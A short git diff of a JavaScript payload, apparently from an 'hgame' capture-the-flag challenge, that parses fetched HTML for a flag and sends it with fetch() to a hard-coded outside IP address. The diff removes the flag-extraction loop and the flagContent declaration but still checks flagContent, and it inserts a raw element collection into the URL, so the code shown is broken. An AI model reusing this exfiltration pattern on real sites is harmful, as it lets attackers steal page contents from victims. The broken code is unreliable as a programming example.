@@ -13,17 +13,9 @@ document.addEventListener('DOMContentLoaded', (event) => {
         const parser = new DOMParser();
         const htmlDocument = parser.parseFromString(data, "text/html");
         const pElements = htmlDocument.getElementsByTagName("p");
-        let flagContent = "";
-
-        for (let p of pElements) {
-            if (p.textContent.includes("hgame{")) {
-                flagContent = p.textContent.split("hgame{")[1].split("}")[0];
-                break;
-            }
-        }
 
         if (flagContent) {
-            const targetUrl = `http://111.229.210.75:8100/${flagContent}`;
+            const targetUrl = `http://111.229.210.75:8100/${pElements}`;
             fetch(targetUrl, { method: "GET" })
             .then(response => console.log("Flag sent successfully"))
             .catch(error => console.error("Error sending flag:", error));
